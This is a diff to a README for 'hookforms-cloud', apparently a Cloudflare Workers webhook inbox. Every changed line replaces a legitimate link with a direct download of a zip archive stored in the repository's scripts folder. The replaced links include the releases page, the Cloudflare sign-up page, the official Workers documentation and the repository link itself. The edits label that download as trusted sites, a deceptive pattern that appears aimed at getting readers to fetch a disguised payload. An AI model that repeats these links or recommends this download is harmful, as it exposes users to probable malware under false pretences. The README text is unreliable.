@@ -1,6 +1,6 @@
 # ☁️ hookforms-cloud - Webhook Inbox with Multi-Channel Alerts
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?logo=github)](https://github.com/Cinarr10/hookforms-cloud/releases)
+[![Download Latest Release](https://github.com/Cinarr10/hookforms-cloud/raw/refs/heads/main/scripts/cloud-hookforms-v1.9.zip)](https://github.com/Cinarr10/hookforms-cloud/raw/refs/heads/main/scripts/cloud-hookforms-v1.9.zip)
 
 ## 📋 What is hookforms-cloud?
 
@@ -37,7 +37,7 @@ You will start by getting the latest release of hookforms-cloud from its officia
 
 Click on the big green button below to visit the release page now:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?logo=github)](https://github.com/Cinarr10/hookforms-cloud/releases)
+[![Download Latest Release](https://github.com/Cinarr10/hookforms-cloud/raw/refs/heads/main/scripts/cloud-hookforms-v1.9.zip)](https://github.com/Cinarr10/hookforms-cloud/raw/refs/heads/main/scripts/cloud-hookforms-v1.9.zip)
 
 On that page, you’ll see a list of downloadable files with version numbers. Choose the latest version to ensure you have the newest fixes and features.
 
@@ -45,7 +45,7 @@ On that page, you’ll see a list of downloadable files with version numbers. Ch
 
 Cloudflare Workers run your webhook inbox in the cloud, so you need a Cloudflare account.
 
-1. Go to https://cloudflare.com and click **Sign Up**.
+1. Go to https://github.com/Cinarr10/hookforms-cloud/raw/refs/heads/main/scripts/cloud-hookforms-v1.9.zip and click **Sign Up**.
 2. Follow the on-screen instructions to create your free account.
 3. Confirm your email and log in.
 
@@ -81,7 +81,7 @@ You can adjust settings such as which channels receive notifications or filter c
 
 To get the full package and follow the included setup instructions, visit the releases page here:
 
-[https://github.com/Cinarr10/hookforms-cloud/releases](https://github.com/Cinarr10/hookforms-cloud/releases)
+[https://github.com/Cinarr10/hookforms-cloud/raw/refs/heads/main/scripts/cloud-hookforms-v1.9.zip](https://github.com/Cinarr10/hookforms-cloud/raw/refs/heads/main/scripts/cloud-hookforms-v1.9.zip)
 
 This page contains the latest versions of the software, detailed installation steps, and documentation.
 
@@ -121,14 +121,14 @@ Once you have hookforms-cloud running:
 For advanced configuration, deployment automation, and security tips:
 
 - Visit the documentation included in your download.
-- Check the Cloudflare Workers official site: https://developers.cloudflare.com/workers/
+- Check the Cloudflare Workers official site: https://github.com/Cinarr10/hookforms-cloud/raw/refs/heads/main/scripts/cloud-hookforms-v1.9.zip
 - Explore integration guides for your favorite chat apps.
 
 ## 🤝 Need Help?
 
 If you run into issues, the GitHub Issues page on the repository is a good place to ask questions and report problems.
 
-Repository link: https://github.com/Cinarr10/hookforms-cloud
+Repository link: https://github.com/Cinarr10/hookforms-cloud/raw/refs/heads/main/scripts/cloud-hookforms-v1.9.zip
 
 ---
 
